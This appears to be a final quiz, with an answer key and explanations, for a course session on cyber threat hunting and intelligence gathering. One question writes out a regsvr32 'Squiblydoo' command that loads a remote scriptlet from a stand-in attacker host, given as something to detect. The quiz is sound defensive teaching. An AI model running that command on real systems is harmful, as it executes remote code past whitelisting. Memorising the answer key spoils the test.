# Final Quiz: Session 07 — Cyber Threat Hunting and Intelligence Gathering

**Instructions:** This quiz assesses mastery of Session 07 content.
Select the best answer for each question.

**Time:** 20 minutes

**Questions:** 7 multiple choice

**Passing Score:** 5/7 (71%)

---

## Question 1

An analyst discovers that a host in the environment has made 1,847 DNS queries in 24 hours — compared to the environment baseline of ~55 queries/day.
Most of the queries are for TXT records with random-looking subdomain names like `a3f2.telemetry-check.io`.
What technique is MOST likely being used?

**A)** T1566.001 - Spearphishing Attachment

**B)** T1071.004 - Application Layer Protocol: DNS (DNS Tunneling)

**C)** T1018 - Remote System Discovery

**D)** T1048.003 - Exfiltration Over Alternative Protocol

**Correct Answer:** B

**Explanation:** The pattern described — high volume of DNS TXT record queries to random subdomains of a single domain — is a strong indicator of DNS tunneling (T1071.004).
Attackers use DNS TXT records to encode commands and data, passing information through DNS which is typically allowed by firewalls.
The high entropy subdomains carry the encoded payload.

---

## Question 2

When writing a Sigma rule, what is the purpose of the `condition` field in the `detection` section?

**A)** It specifies the SIEM platform the rule is written for.

**B)** It defines the log source type and product the rule applies to.

**C)** It expresses the boolean logic combining `selection` and `filter` blocks to determine when an alert fires.

**D)** It sets the alert severity level (informational, low, medium, high, critical).

**Correct Answer:** C

**Explanation:** In Sigma, the `condition` field is where the boolean logic is expressed.
It combines named selection blocks using operators like `and`, `or`, `not`, and quantifiers like `1 of selection_*`.
Example: `condition: selection_main and not filter_legitimate`.
The `logsource` field handles log source definition, and `level` handles severity.

---

## Question 3

The Pyramid of Pain model categorizes indicators by how difficult they are for attackers to change.
Which type of indicator sits at the TOP of the pyramid, representing the most painful (difficult) change for an attacker?

**A)** File hashes (MD5, SHA256)

**B)** IP addresses

**C)** Domain names

**D)** Tactics, Techniques, and Procedures (TTPs)

**Correct Answer:** D

**Explanation:** TTPs sit at the top of the Pyramid of Pain because they represent the attacker's fundamental tradecraft — their methodology, tools, and operational habits.
Changing TTPs requires retraining, developing new tools, and altering operations, which takes months.
File hashes (bottom) can be changed in seconds, and IPs/domains can be changed in hours to days.

---

## Question 4

In MISP, what is the difference between an **Attribute** and an **Object**?

**A)** Attributes are used for IP addresses only; Objects are used for all other indicator types.

**B)** Attributes are single data points (e.g., one IP or one hash); Objects group multiple related attributes representing a single entity (e.g., a file with its name, hash, and size).

**C)** Attributes require manual creation; Objects are automatically imported from threat feeds.

**D)** Attributes are shared publicly; Objects are kept private to your organization.

**Correct Answer:** B

**Explanation:** In MISP, an Attribute is a single indicator or data point (e.g., type: `ip-dst`, value: `1.2.3.4`).
An Object is a template-based grouping of related attributes representing one entity — for example, a "file" Object contains `filename`, `sha256`, `md5`, `size-in-bytes`, and `mimetype` as separate attributes, all linked together.
Objects provide richer context than standalone attributes.

---

## Question 5

Your organization uses the threat hunting maturity model.
Currently, your team performs ad-hoc searches for IOCs from threat feeds (e.g., looking up whether any known-bad IP appeared in your firewall logs).
What maturity level does this represent, and what is the MOST important capability to develop next to advance to the next level?

**A)** Level 0; advance by deploying a SIEM

**B)** Level 1; advance by developing hypothesis-driven hunts based on ATT&CK techniques

**C)** Level 2; advance by implementing statistical anomaly detection

**D)** Level 3; advance by automating all detection into continuous pipelines

**Correct Answer:** B

**Explanation:** Searching for known IOCs from threat feeds is characteristic of **Level 1 (Minimal)** hunting — it's IOC-based and reactive to published intelligence.
The key advancement to **Level 2 (Procedural)** is moving from "search for known-bad" to "hunt for behaviors" — using ATT&CK techniques as hunting targets and writing playbooks for systematic technique-based hunting.

---

## Question 6

During a threat hunt, you find that `regsvr32.exe` executed with the argument `/i:https://attacker.com/payload.sct scrobj.dll`.
Which ATT&CK technique does this represent, and why is it significant?

**A)** T1059.001 - PowerShell; because regsvr32 is used to bypass PowerShell restrictions

**B)** T1218.010 - System Binary Proxy Execution: Regsvr32; because regsvr32 is a trusted Windows binary that can execute remote scripts while bypassing application whitelisting

**C)** T1190 - Exploit Public-Facing Application; because the attack came from an external URL

**D)** T1105 - Ingress Tool Transfer; because a file is downloaded from the internet

**Correct Answer:** B

**Explanation:** This is the "Squiblydoo" technique, documented as T1218.010.
Regsvr32.exe is a trusted, signed Windows binary that can load COM scriptlets (`.sct` files) from remote URLs.
Because regsvr32 is a legitimate Windows tool, it often bypasses application whitelisting (AppLocker/WDAC) and leaves minimal traces.
The key indicators: `/s` (silent), `/n` (no default registration), `/u` (unregister), `/i:URL` (load from URL).

---

## Question 7

What is the Diamond Model of Intrusion Analysis primarily used for?

**A)** Scoring the severity of a security incident based on business impact

**B)** Mapping detected attacks to MITRE ATT&CK techniques in a standardized format

**C)** Analyzing the relationships between adversary, infrastructure, capability, and victim to pivot and find related intrusions

**D)** Calculating the minimum detection time required to prevent a given type of data breach

**Correct Answer:** C

**Explanation:** The Diamond Model represents an intrusion as a relationship between four core features: Adversary, Infrastructure, Capability, and Victim.
Its primary value is in **pivoting** — using known elements to discover unknown ones.
For example: if you know the C2 infrastructure (IP/domain), you can pivot to find other victims who accessed that infrastructure.
If you know the adversary, you can predict what infrastructure they'll use next based on past patterns.

---

*End of Final Quiz*
*Review areas of weakness in the Session 07 Reading Material*
